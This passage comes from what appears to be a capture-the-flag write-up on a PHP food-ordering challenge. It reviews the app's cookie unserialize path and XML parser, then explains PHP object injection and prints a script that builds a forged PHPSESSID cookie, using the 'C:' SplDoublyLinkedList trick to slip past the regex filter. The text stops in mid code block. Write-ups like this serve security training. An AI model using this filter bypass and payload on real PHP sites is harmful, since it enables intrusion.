	<span class="nv">$user</span><span class="o">-&gt;</span><span class="n">username</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">uniqid</span><span class="p">(</span><span class="s1">'guest_'</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
	<span class="nb">setcookie</span><span class="p">(</span>
		<span class="s1">'PHPSESSID'</span><span class="p">,</span> 
		<span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">)),</span> 
		<span class="nb">time</span><span class="p">()</span><span class="o">+</span><span class="mi">60</span><span class="o">*</span><span class="mi">60</span><span class="o">*</span><span class="mi">24</span><span class="p">,</span> 
		<span class="s1">'/'</span>
	<span class="p">);</span>
<span class="p">}</span>

<span class="nv">$router</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Router</span><span class="p">();</span>

<span class="nv">$router</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">(</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">,</span> <span class="k">fn</span><span class="p">(</span><span class="nv">$router</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nv">$router</span><span class="o">-&gt;</span><span class="nf">view</span><span class="p">(</span><span class="s1">'menu'</span><span class="p">));</span>
<span class="nv">$router</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">(</span><span class="s1">'POST'</span><span class="p">,</span> <span class="s1">'/api/order'</span><span class="p">,</span> <span class="s1">'OrderController@order'</span><span class="p">);</span>

<span class="k">die</span><span class="p">(</span><span class="nv">$router</span><span class="o">-&gt;</span><span class="k">match</span><span class="p">());</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Then a bunch of routes is defined from the <code class="language-plaintext highlighter-rouge">Router</code> class contained inside <code class="language-plaintext highlighter-rouge">Router.php</code>, one of which is the one performing the user order through the <code class="language-plaintext highlighter-rouge">OrderController</code> class.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="n">safe_object</span><span class="p">(</span><span class="nv">$serialized_data</span><span class="p">)</span>
<span class="p">{</span>
	<span class="nv">$matches</span> <span class="o">=</span> <span class="p">[];</span>
	<span class="nv">$num_matches</span> <span class="o">=</span> <span class="nb">preg_match_all</span><span class="p">(</span><span class="s1">'/(^|;)O:\d+:"([^"]+)"/'</span><span class="p">,</span> <span class="nv">$serialized_data</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">);</span>

	<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$num_matches</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="nv">$methods</span> <span class="o">=</span> <span class="nb">get_class_methods</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="nv">$i</span><span class="p">]);</span>
		<span class="k">foreach</span> <span class="p">(</span><span class="nv">$methods</span> <span class="k">as</span> <span class="nv">$method</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^__.*$/'</span><span class="p">,</span> <span class="nv">$method</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
				<span class="k">die</span><span class="p">(</span><span class="s2">"Unsafe method: ${method}"</span><span class="p">);</span>
			<span class="p">}</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">OrderController</span>
<span class="p">{</span>
	<span class="k">public</span> <span class="k">function</span> <span class="n">order</span><span class="p">(</span><span class="nv">$router</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="nv">$body</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'php://input'</span><span class="p">);</span>
		<span class="nv">$cookie</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'PHPSESSID'</span><span class="p">]);</span>
		<span class="nf">safe_object</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">);</span>
		<span class="nv">$user</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">);</span>

		<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_CONTENT_TYPE'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'application/json'</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="nv">$order</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$body</span><span class="p">);</span>
			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$order</span><span class="o">-&gt;</span><span class="n">food</span><span class="p">)</span> 
				<span class="k">return</span> <span class="nb">json_encode</span><span class="p">([</span>
					<span class="s1">'status'</span> <span class="o">=&gt;</span> <span class="s1">'danger'</span><span class="p">,</span>
					<span class="s1">'message'</span> <span class="o">=&gt;</span> <span class="s1">'You need to select a food option first'</span>
				<span class="p">]);</span>
			<span class="k">if</span> <span class="p">(</span><span class="nv">$_ENV</span><span class="p">[</span><span class="s1">'debug'</span><span class="p">])</span>
			<span class="p">{</span>
				<span class="nv">$date</span> <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s1">'d-m-Y G:i:s'</span><span class="p">);</span>
				<span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'/tmp/orders.log'</span><span class="p">,</span> <span class="s2">"[${date}] ${body} by </span><span class="si">{</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="n">username</span><span class="si">}</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="no">FILE_APPEND</span><span class="p">);</span>
			<span class="p">}</span>
			<span class="k">return</span> <span class="nb">json_encode</span><span class="p">([</span>
				<span class="s1">'status'</span> <span class="o">=&gt;</span> <span class="s1">'success'</span><span class="p">,</span>
				<span class="s1">'message'</span> <span class="o">=&gt;</span> <span class="s2">"Hello </span><span class="si">{</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="n">username</span><span class="si">}</span><span class="s2">, your </span><span class="si">{</span><span class="nv">$order</span><span class="o">-&gt;</span><span class="n">food</span><span class="si">}</span><span class="s2"> order has been submitted successfully."</span>
			<span class="p">]);</span>
		<span class="p">}</span>
		<span class="k">else</span>
		<span class="p">{</span>
			<span class="k">return</span> <span class="nv">$router</span><span class="o">-&gt;</span><span class="nf">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Taking a closer look at that class we can see that it reads the <code class="language-plaintext highlighter-rouge">PHPSESSID</code> and then it tries to <strong>unserialize</strong> it. Between the two operations, however, the backend verifies which methods are available for every object using a very specific regex.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="n">safe_object</span><span class="p">(</span><span class="nv">$serialized_data</span><span class="p">)</span>
<span class="p">{</span>
	<span class="nv">$matches</span> <span class="o">=</span> <span class="p">[];</span>
	<span class="nv">$num_matches</span> <span class="o">=</span> <span class="nb">preg_match_all</span><span class="p">(</span><span class="s1">'/(^|;)O:\d+:"([^"]+)"/'</span><span class="p">,</span> <span class="nv">$serialized_data</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">);</span>

	<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$num_matches</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="nv">$methods</span> <span class="o">=</span> <span class="nb">get_class_methods</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="nv">$i</span><span class="p">]);</span>
		<span class="k">foreach</span> <span class="p">(</span><span class="nv">$methods</span> <span class="k">as</span> <span class="nv">$method</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^__.*$/'</span><span class="p">,</span> <span class="nv">$method</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
				<span class="k">die</span><span class="p">(</span><span class="s2">"Unsafe method: ${method}"</span><span class="p">);</span>
			<span class="p">}</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>
<span class="mf">...</span>
</pre></td></tr></tbody></table></code></div></div>

<p>If the regex matches some PHP magic methods <sup id="fnref:magic"><a href="#fn:magic" class="footnote" rel="footnote" role="doc-noteref">1</a></sup> - so the one starting with <code class="language-plaintext highlighter-rouge">__</code> - then the application returns an error, otherwise, it sets up the user object and then returns the message that pops out when submitting the order.</p>

<p>The <code class="language-plaintext highlighter-rouge">OrderController</code> class also checks if the debug environment variable is set and if itâ€™s true, it writes some logs.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="mf">...</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$_ENV</span><span class="p">[</span><span class="s1">'debug'</span><span class="p">])</span>
<span class="p">{</span>
	<span class="nv">$date</span> <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s1">'d-m-Y G:i:s'</span><span class="p">);</span>
	<span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'/tmp/orders.log'</span><span class="p">,</span> <span class="s2">"[${date}] ${body} by </span><span class="si">{</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="n">username</span><span class="si">}</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="no">FILE_APPEND</span><span class="p">);</span>
<span class="p">}</span>
<span class="mf">...</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Ok, up to here the application seems very secure, however, we still need to take a look at the two classes used to instantiate the two objects <code class="language-plaintext highlighter-rouge">UserModel</code> and <code class="language-plaintext highlighter-rouge">XmlParserModel</code>.</p>

<p><code class="language-plaintext highlighter-rouge">UserModel</code> looks very basic, it just contains the username property.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="kd">class</span> <span class="nc">UserModel</span>
<span class="p">{</span>
	<span class="k">public</span> <span class="kt">string</span> <span class="nv">$username</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">XmlParserModel</code> on the other hand appears very peculiar.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="kd">class</span> <span class="nc">XmlParserModel</span>
<span class="p">{</span>
	<span class="k">private</span> <span class="kt">string</span> <span class="nv">$data</span><span class="p">;</span>
	<span class="k">private</span> <span class="kt">array</span> <span class="nv">$env</span><span class="p">;</span>

	<span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">()</span>
	<span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match_all</span><span class="p">(</span><span class="s2">"/&lt;!(?:DOCTYPE|ENTITY)(?:\s|%|&amp;#[0-9]+;|&amp;#x[0-9a-fA-F]+;)+[^\s]+\s+(?:SYSTEM|PUBLIC)\s+[\'</span><span class="se">\"</span><span class="s2">]/im"</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">))</span>
		<span class="p">{</span>
			<span class="k">die</span><span class="p">(</span><span class="s1">'Unsafe XML'</span><span class="p">);</span>
		<span class="p">}</span>
		<span class="nv">$env</span> <span class="o">=</span> <span class="o">@</span><span class="nb">simplexml_load_string</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="s1">'SimpleXMLElement'</span><span class="p">,</span> <span class="no">LIBXML_NOENT</span><span class="p">);</span>

		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$env</span><span class="p">)</span> 
		<span class="p">{</span>
			<span class="k">die</span><span class="p">(</span><span class="s1">'Malformed XML'</span><span class="p">);</span>
		<span class="p">}</span>

		<span class="k">foreach</span> <span class="p">(</span><span class="nv">$env</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="nv">$_ENV</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">string</span><span class="p">)</span><span class="nv">$value</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The class implements two magic methods:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">__construct()</code><sup id="fnref:construct"><a href="#fn:construct" class="footnote" rel="footnote" role="doc-noteref">2</a></sup>, which is invoked every time an object is created and simply assigns the passed data to the object property,</li>
  <li>and <code class="language-plaintext highlighter-rouge">__wakeup()</code><sup id="fnref:wakeup"><a href="#fn:wakeup" class="footnote" rel="footnote" role="doc-noteref">3</a></sup>, which is invoked every time a script tries to call an object as a function or every time an <code class="language-plaintext highlighter-rouge">unserialize()</code> function is invoked on that object. This method verifies that the content of the data properties is a safe XML, then it converts the XML string into an object using <code class="language-plaintext highlighter-rouge">simplexml_load_string</code> and finally, it creates an environment variable for every key contained inside the XML.</li>
</ul>

<h2 id="exploitation"><span class="me-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>By looking through the code I noticed different things that perhaps can be exploited or used during an exploitation chain:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">index.php</code> and <code class="language-plaintext highlighter-rouge">Router.php</code> both contain some <code class="language-plaintext highlighter-rouge">include</code> that maybe can be used to exploit a Path Traversal or a Local File Inclusion,</li>
  <li>the <code class="language-plaintext highlighter-rouge">OrderController</code> class writes some logs that maybe can be used in combination with the LFI,</li>
  <li>the same class also uses the PHP Complex Syntax <sup id="fnref:complex"><a href="#fn:complex" class="footnote" rel="footnote" role="doc-noteref">4</a></sup>, that in some cases can lead to RCE,</li>
  <li>and unserialize user-controllable data, which can potentially allow the injection of PHP Object to alter the program logic.</li>
</ul>

<p>There are so many possibilities, but which is the correct one? 
Or even worse: is one of these paths the right one?</p>

<p>In this challenge, users can only control 4 data: the ordered food, the table number, the serialized cookie, and the XML file parsed by the application.</p>

<p>Searching where the ordered food is used didnâ€™t highlight dangerous uses, so we can exclude this option. The same can be done with the table number, which even never appears within the code. 
The remaining option is to exploit the PHPSESSID cookie and try to inject some kind of PHP object.</p>

<h3 id="php-object-injection-php-deserialization"><span class="me-2">PHP Object Injection (PHP deserialization)</span><a href="#php-object-injection-php-deserialization" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<blockquote class="bug">
  <p>The application uses the PHPSESSID cookie to pass a PHP object to the server that will be then deserialized. Assigning to the PHPSESSID cookie other valid serialized objects, it is possible to deserialize arbitrary PHP objects and alter the program logic.</p>
</blockquote>

<p>I wrote a simple PHP script that serializes two custom objects, one using the <code class="language-plaintext highlighter-rouge">UserModel</code> class and one using the <code class="language-plaintext highlighter-rouge">XmlParserModel</code>.</p>

<p><em>test-serialize.php</em></p>
<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="kd">class</span> <span class="nc">XmlParserModel</span> <span class="p">{</span>
	<span class="k">public</span> <span class="kt">string</span> <span class="nv">$data</span><span class="p">;</span>
	<span class="k">public</span> <span class="kt">array</span> <span class="nv">$env</span> <span class="o">=</span> <span class="p">[];</span>
	<span class="k">public</span> <span class="kt">string</span> <span class="nv">$username</span><span class="p">;</span>

	<span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
		<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">UserModel</span>
<span class="p">{</span>
	<span class="k">public</span> <span class="kt">string</span> <span class="nv">$username</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">echo</span> <span class="s2">"--- User ---</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">UserModel</span><span class="p">();</span>
<span class="nv">$user</span><span class="o">-&gt;</span><span class="n">username</span> <span class="o">=</span> <span class="s2">"0xbro"</span><span class="p">;</span>
<span class="nb">print_r</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
<span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">));</span>

<span class="k">echo</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">--- XML ---</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="nv">$xml</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XmlParserModel</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'.env'</span><span class="p">));</span>
<span class="nb">print_r</span><span class="p">(</span><span class="nv">$xml</span><span class="p">);</span>
<span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$xml</span><span class="p">));</span>
</pre></td></tr></tbody></table></code></div></div>

<p>As expected, providing the first serialized object to the backend nothing happened. Instead, providing an <code class="language-plaintext highlighter-rouge">XmlParserModel</code> object caused the server to fail, telling us that we provided an object having an unsafe method.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>HTTP/1.1 200 OK
...

Unsafe method: __construct
</pre></td></tr></tbody></table></code></div></div>

<p>We donâ€™t get a successful response back because the serialized object contains unsafe methods, but the fact that the server responds indicates that the request was successful and the server tries to deserialize the arbitrary object.</p>

<h3 id="safe_object-waf-bypass"><span class="me-2">safe_object WAF bypass</span><a href="#safe_object-waf-bypass" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<blockquote class="bug">
  <p>The regex is misconfigured and do not consider custom serialized objects using the <code class="language-plaintext highlighter-rouge">C:</code> syntax. Using those objects it is possible to bypass the regex and deserialize dangerous objects.</p>
</blockquote>

<p>After some research I found this wonderful writeup <sup id="fnref:writeup"><a href="#fn:writeup" class="footnote" rel="footnote" role="doc-noteref">5</a></sup> from MegadodoPubblications talking about a Remote Code Execution in Composr. Although the target is different than ours, going through the article I found a really interesting thing. The author had to bypass the same regex weâ€™re facing.</p>

<p><em>validation function</em></p>
<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="k">function</span> <span class="n">secure_serialized_data</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$serialized_data</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$matches</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="nv">$num_matches</span> <span class="o">=</span> <span class="nb">preg_match_all</span><span class="p">(</span><span class="s1">'#(^|;)O:\d+:"([^"]+)"#'</span><span class="p">,</span> <span class="nv">$serialized_data</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$num_matches</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>

        <span class="nv">$methods</span> <span class="o">=</span> <span class="nb">get_class_methods</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="nv">$i</span><span class="p">]);</span>

        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$methods</span> <span class="k">as</span> <span class="nv">$method</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'#^__.*$#'</span><span class="p">,</span> <span class="nv">$method</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$serialized_data</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The writeup shows <strong>three different bypasses</strong>:</p>
<ol>
  <li>The first one uses a <strong>plus sign to bypass the regex</strong>, however, starting from PHP 7.2 it doesnâ€™t work anymore. For this challenge we are using PHP 7, so we can scrap this first option.</li>
  <li>The second one exploits a <strong>parser differential between the regex and the PHP serialized object</strong>, tricking the regex into thinking that <code class="language-plaintext highlighter-rouge">;O:10</code> is the class name of the object and so hiding â€œHelloWorldâ€ from the regex.</li>
  <li>Finally, the third one uses a pretty <strong>unknown and deprecated feature</strong> that allows the creation of custom serialized objects starting with <code class="language-plaintext highlighter-rouge">C:</code> instead of the classic syntax.</li>
</ol>

<blockquote class="info">
  <p>Traditional PHP basic types variables follow standard rules:</p>
  <ul>
    <li>null values become <code class="language-plaintext highlighter-rouge">N;</code></li>
    <li>booleans become <code class="language-plaintext highlighter-rouge">b:</code> and the value of the boolean integers become <code class="language-plaintext highlighter-rouge">i:number;</code></li>
    <li>strings become <code class="language-plaintext highlighter-rouge">s:</code> the number of characters <code class="language-plaintext highlighter-rouge">:</code> the string</li>
    <li>objects become <code class="language-plaintext highlighter-rouge">O:</code> the length of the object name <code class="language-plaintext highlighter-rouge">:</code> object name <code class="language-plaintext highlighter-rouge">:</code> object size and then all the properties inside brackets</li>
    <li>arrays become <code class="language-plaintext highlighter-rouge">a:</code> the length of the array and then all the <code class="language-plaintext highlighter-rouge">key;value</code> definitions inside brackets</li>
  </ul>

  <p>However, by implementing the <code class="language-plaintext highlighter-rouge">Serializable</code> interface, it is possible to serialize data using the <code class="language-plaintext highlighter-rouge">C:</code> format.</p>
</blockquote>

<p>I started using the same code provided in the writeup <sup id="fnref:Spl"><a href="#fn:Spl" class="footnote" rel="footnote" role="doc-noteref">6</a></sup>, but it didnâ€™t work as expected. It returned a different serialized object that didnâ€™t use either the <code class="language-plaintext highlighter-rouge">C:</code> format or the <code class="language-plaintext highlighter-rouge">;:</code> trick to bypass the regex, but instead was a pretty standard serialized object.</p>

<p>Because the official PHP documentation [^PHPinternals] says that inside serialized object created using the <code class="language-plaintext highlighter-rouge">Serializable</code> interface there could be any payload between braces, I decided to create a script that simply injects my serialized object within the example provided in the write-up.</p>

<p>The PHP code declares an <code class="language-plaintext highlighter-rouge">XmlParserModel</code> class equal to the applicationâ€™s one, then it creates the object reading our previous XML payload, serializes it, calculates the corresponding length, and finally places it inside the â€œcontainerâ€ shown on GitHub.</p>

<p><em>c_serialize.php</em></p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="kd">class</span> <span class="nc">XmlParserModel</span> <span class="p">{</span>
	<span class="k">public</span> <span class="kt">string</span> <span class="nv">$data</span><span class="p">;</span>
	<span class="k">public</span> <span class="kt">array</span> <span class="nv">$env</span><span class="p">;</span>
	<span class="k">public</span> <span class="kt">string</span> <span class="nv">$username</span><span class="p">;</span>

	<span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
		<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="nv">$xml</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XmlParserModel</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'.env'</span><span class="p">));</span>
<span class="nv">$xml</span><span class="o">-&gt;</span><span class="n">username</span> <span class="o">=</span> <span class="s1">'h4ck3d'</span><span class="p">;</span>
<span class="nv">$payload</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$xml</span><span class="p">);</span>

<span class="nv">$l</span> <span class="o">=</span> <span class="mi">11</span> <span class="o">+</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$payload</span> <span class="p">);</span>
<span class="k">echo</span> <span class="s1">'PHPSESSID='</span><span class="mf">.</span><span class="nb">base64_encode</span><span class="p">(</span><span class="s1">'C:19:"SplDoublyLinkedList":'</span> <span class="mf">.</span> <span class="nv">$l</span> <span class="mf">.</span> <span class="s1">':{i:0;:'</span> <span class="mf">.</span> <span class="nv">$payload</span> <span class="mf">.</span> <span class="s1">':i:42;}'</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Testing the result on regex101 we can see that this time the regex does not match anymore.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
